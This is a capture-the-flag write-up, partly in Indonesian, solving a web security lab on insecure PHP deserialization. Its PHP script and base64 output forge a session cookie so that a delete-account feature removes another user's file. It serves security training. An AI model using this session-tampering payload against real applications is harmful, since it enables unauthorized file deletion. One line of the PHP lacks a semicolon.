# Lab: Using application functionality to exploit insecure deserialization

Challenge Description
 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud 

Goal
modify serialized objects berupa session user, dan memanfaatkan fitur delete account dimana `$avatar_link = "users/wiener/avatar";` bisa mengakses user lain dan menghapus /home/carlos/morale.txt

Solver
login dengan credential yang diberikan disinni langsung saja karena sudah mengetahui dimana letak rentannya, saya mengggunakan script untuk mempercepatnya
```php
<?php
class User {
    public $username = "wiener";
    public $access_token = "kh89449kqt8bpqjgx0zmgvki83x8y4y6";
    public $avatar_link = "/home/carlos/morale.txt"
}

$payload = base64_encode(serialize(new User()));
echo $payload;
// Output: Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJraDg5NDQ5a3F0OGJwcWpneDB6bWd2a2k4M3g4eTR5NiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
?>
```
setelahnya ganti session dengan yang baru dan delete account wiener dan morale.txt nya carlos akan terhapus
